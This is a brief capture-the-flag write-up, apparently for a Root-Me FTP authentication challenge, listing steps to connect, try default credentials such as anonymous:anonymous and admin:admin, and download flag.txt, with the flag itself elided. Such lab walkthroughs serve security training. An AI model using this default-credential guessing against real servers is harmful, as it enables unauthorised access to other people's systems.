# FTP - Authentication

## Solution

FTP protocol authentication challenge.

### Step 1: Connect to FTP Server

```bash
ftp <server_ip>
```

### Step 2: Try Common Credentials
- anonymous:anonymous
- admin:admin
- ftp:ftp

```bash
# Anonymous FTP
ftp <server>
Name: anonymous
Password: [email or blank]
```

### Step 3: List and Retrieve Files

```bash
ftp> ls
ftp> get flag.txt
ftp> bye
```

### Tools
- ftp client
- FileZilla
- curl

### Flag

```
RM{...}
```
